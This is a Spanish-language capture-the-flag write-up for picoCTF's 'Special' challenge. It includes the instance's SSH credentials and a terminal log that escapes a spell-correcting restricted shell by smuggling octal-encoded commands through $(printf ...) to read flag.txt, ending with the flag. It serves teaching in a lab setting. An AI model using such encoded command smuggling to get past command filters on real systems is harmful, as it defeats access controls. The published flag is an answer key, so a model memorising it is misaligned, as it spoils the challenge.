### **Descripción**

Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.`ssh -p 59925 ctf-player@saturn.picoctf.net`The password is `3f39b042`
## Solución

**Solución 1- usando python**
``` 
PS C:\Users\Usuario> ssh -p 59925 ctf-player@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:59925 ([13.59.203.175]:59925)' can't be established.
ED25519 key fingerprint is SHA256:tJ0wuU5yBvNO/FrkHmR9iY36VJClMhKV+Hq2sxqKFmg.
This host key is known by the following other names/addresses:
    C:\Users\Usuario/.ssh/known_hosts:11: [saturn.picoctf.net]:51883
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:59925' (ED25519) to the list of known hosts.
ctf-player@saturn.picoctf.net's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.8.0-1044-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Special$ `ls`
Also
sh: 1: Also: not found
Special$ `cat flag.txt`
Cat flag.txt`
sh: 1: Syntax error: EOF in backquote substitution
Special$ <flag.txt
<flag.txt
sh: 1: cannot open flag.txt: No such file
Special$ grep<flag.txt
Grep<flag.txt
sh: 1: cannot open flag.txt: No such file
sh: 1: Grep: not found
Special$ grep . *
Grew . *
sh: 1: Grew: not found
Special$ /bin/ls
Absolutely not paths like that, please!
Special$ ${SHELL:1:1}${SHELL:4:1}
${SHELL:1:1}${SHELL:4:1}
sh: 1: Bad substitution
Special$ $0
I
sh: 1: I: not found
Special$ /???/??
Absolutely not paths like that, please!
Special$ $(set)
$(set)
sh: 1: HOME='/home/ctf-player': not found
Special$ $(printf "\154\163")
$(printf "\154\163")
blargh
Special$ $(printf "\154\163\040\142\154\141\162\147\150")
$(printf "\154\163\040\142\154\141\162\147\150")
flag.txt
Special$ $(printf "\143\141\164\040\142\154\141\162\147\150\057\146\154\141\147\056\164\170\164")
$(printf "\143\141\164\040\142\154\141\162\147\150\057\146\154\141\147\056\164\170\164")
picoCTF{5p311ch3ck_15_7h3_w0r57_f906e25a}Special$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.


```

#### NOTAS
¿Cuál es el truco de "Special"?
La descripción dice que es una "Interfaz con Corrector Ortográfico" que capitaliza palabras automáticamente. En seguridad, esto suele ser un **filtro** que impide ejecutar comandos normales (como `ls` o `cat`) porque los transforma en algo que la terminal no reconoce (como `Ls` o `Cat`).

~Aquí el truco es usar una sintaxis que la shell de Linux entienda pero que el script de corrección no sepa cómo procesar.

Como se logró?
- **Bypass de Capitalización**: Usar `$(printf "...")` para inyectar comandos. Como la línea empieza con un símbolo `$`, el corrector ortográfico no capitalizó la primera letra del comando real (`ls` o `cat`) porque aún no existía como texto plano.

- **Codificación Octal**: Al usar secuencias como `\154` (l) y `\163` (s), esconde el comando de cualquier escáner de "lista negra" que estuviera buscando la palabra prohibida `ls`.

- **Encadenamiento de Directorios**: Identificar correctamente la carpeta `blargh` y construir la ruta completa hacia `flag.txt` usando solo códigos numéricos y barras diagonales.